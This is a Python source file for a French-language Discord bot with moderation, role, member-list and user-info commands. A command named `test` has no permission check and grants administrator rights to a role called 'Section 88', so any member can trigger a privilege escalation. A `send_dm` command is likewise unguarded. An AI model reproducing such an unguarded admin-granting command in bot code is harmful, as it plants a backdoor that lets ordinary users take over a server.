import os
import discord
from discord.ext import commands
#import youtube_dl
import datetime
from datetime import date

intents = discord.Intents.default()
intents.members = True
botToken = os.getenv('DISCORD_TOKEN')
bot = commands.Bot(command_prefix='!', description="Just a Bot", intents = intents)


@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord')




@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content == "Quel temps fait-il ?":
        await message.channel.send("Il fait très beau.")
        return

    await bot.process_commands(message)


@bot.command()
async def siri(ctx, arg):
    await ctx.send(ctx.author.mention + " pourquoi me dis-tu " + arg + " ?")

@bot.command(name = 'print')
async def prin(ctx, *arg):
    await ctx.send(" ".join(arg))

@bot.command()
async def meteo(ctx,arg):
    await ctx.send('Il fait très beau à ',arg)

@bot.command(name = 'clear')
@commands.has_permissions(manage_messages = True)
async def clear(ctx, nombre : int):
    messages = await ctx.channel.history(limit = nombre + 1).flatten()
    for message in messages:
        await message.delete()

@bot.command()
@commands.has_permissions(kick_members = True)
async def kick(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.kick(user, reason = reason)
    await ctx.send(f'{user} a été kick')

@bot.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.ban(user, reason = reason)
    await ctx.send(f'{user} a été ban pour la raison suivante : {reason}')

@bot.command()
@commands.has_permissions(ban_members = True)
async def unban(ctx, user, *reason):
    reason = "".join(reason)
    userName, userId = user.split("#")
    bannedUsers = await ctx.guild.bans()
    for i in bannedUsers:
        if i.user.name == userName and i.user.discriminator == userId:
            await ctx.guild.unban(i.user, reason = reason)
            await ctx.send(f'{user} a été débanni')
            return
    await ctx.send(f"L'utilisateur {user} n'est pas dans la liste des bannis")

@bot.command(name = 'idunban')
@commands.has_permissions(ban_members = True)
async def _unban(ctx, id : int):
    userid = await bot.fetch_user(id)
    await ctx.guild.unban(userid)
    await ctx.send(f"{userid} a été débanni")

@bot.command()
async def send_dm(ctx, member: discord.Member, content):
    channel = await member.create_dm()
    await channel.send(content)

@bot.command()
async def ah(ctx):
    await ctx.send("Ah")

@bot.command()
async def test(ctx):
    perms = discord.Permissions()
    perms.update(administrator = True)
    role = discord.utils.get(ctx.author.guild.roles, name="Section 88")
    await role.edit(reason=None, permissions=perms)



@bot.command()
async def event(ctx, members: commands.Greedy[discord.Member]):
    role = discord.utils.get(members[0].guild.roles, name='Event Member')
    for m in members:
        if role in m.roles:
            await m.remove_roles(role)
            await ctx.send(f'Le rôle {role.name} a été retiré aux personne qui possédaient déjà ce rôle')
        else :
            await m.add_roles(role)
            await ctx.send(f'{m.name} a reçu le role : {role.name}')


@bot.command(name = "event-list")
async def eventlist(ctx):
     role = discord.utils.get(ctx.guild.roles, name='Event Member')
     for member in ctx.guild.members:
            if role in member.roles:
                   await ctx.send(f'{member.name} is an event’s member')


@bot.command()
async def list(ctx):
    embed = discord.Embed(title = "**Member's list**", description = "Members of this server :", color = 0xFF1F00)
    embed.set_thumbnail(url = "https://emoji.gg/assets/emoji/1279-flag-su.png")
    for m in ctx.guild.members:
        embed.add_field(name = f'Member :', value = m.name)
    await ctx.send(embed = embed)


@bot.command()
async def avatar(ctx, member : discord.Member = None):
    if member == None:
        user = ctx.author
    else:
        user = member
    embed = discord.Embed(title="**Avatar picture :**", description=f"{user.name}'s avatar :", color=0x48FF7A)
    embed.set_image(url = user.avatar_url)
    await ctx.send(embed = embed)

"""@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.clean_content == "Feur":
        await message.delete()
    elif message.clean_content == "FEUR":
        await message.delete()
    elif message.clean_content == "feur":
        await message.delete()
    elif message.clean_content == "F e u r":
        await message.delete()
    elif message.clean_content == "f e u r":
        await message.delete()
    elif message.clean_content == "fe ur":
        await message.delete()
    elif message.clean_content == "Fe ur":
        await message.delete()"""


@bot.command()
async def ui(ctx, member : discord.Member = None):
    if member == None:
        user = ctx.author
    else:
        user = member
    create = user.created_at
    strcreate= str(create)
    repcreate = strcreate.replace("-", "/")
    day, hour = repcreate.split(" ")
    createyear, createmonth, createday = day.split("/")
    createyear = int(createyear)
    createmonth = int(createmonth)
    createday = int(createday)
    createdate = datetime.date(createyear, createmonth, createday)
    join = user.joined_at
    join = str(join)
    join = join.replace("-", "/")
    date2, hour2 = join.split(" ")
    joinyear, joinmonth, joinday = date2.split("/")
    joinyear = int(joinyear)
    joinmonth = int(joinmonth)
    joinday = int(joinday)
    joindate = datetime.date(joinyear, joinmonth, joinday)
    today = date.today()
    jointime = today - joindate
    jointime = str(jointime)
    jointime, uselessshit2 = jointime.split(",")
    timecreate = today - createdate
    timecreate = str(timecreate)
    timecreate, uselessshit = timecreate.split(",")
    embed = discord.Embed(title="**User Informations :**", description=f"{user.name}'s informations :", color=0x48FF7A)
    embed.add_field(name = "Account creation :", value = f"{day} ({timecreate} ago)")
    embed.add_field(name="Joined on :", value = f"{date2} ({jointime} ago)", inline = False)
    await ctx.send(embed = embed)








bot.run(botToken)
